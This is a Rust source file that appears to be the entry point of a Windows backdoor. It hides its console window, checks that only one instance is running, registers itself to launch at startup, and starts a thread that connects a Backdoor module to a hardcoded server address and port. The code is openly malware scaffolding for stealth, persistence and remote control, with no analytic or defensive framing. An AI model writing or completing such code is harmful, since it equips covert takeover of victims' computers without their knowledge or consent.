#![windows_subsystem = "windows"]

mod backdoor;
mod helper;

#[cfg(not(target_os = "windows"))]
fn main() 
{
    panic!("This program is only for Windows");
}

fn main() 
{
    use std::thread;
    use backdoor::Backdoor;

    extern {
        fn hideConsole();
    }

    const SERVER_IP: &'static str = "192.168.0.22";
    const SERVER_PORT: &'static str = "1973";

    unsafe {
        hideConsole();
    }
    
    let helper = helper::Helper::new();

    if helper.check_if_process_exists()
    {
        return;
    }

    if let Err(_) = helper.add_to_startup()
    {
        return;
    }

    let my_backdoor = Backdoor::new();

    let handle = thread::spawn(move || {
        my_backdoor.run(&format!("{}:{}", SERVER_IP, SERVER_PORT));
    });

    handle.join().unwrap();
}
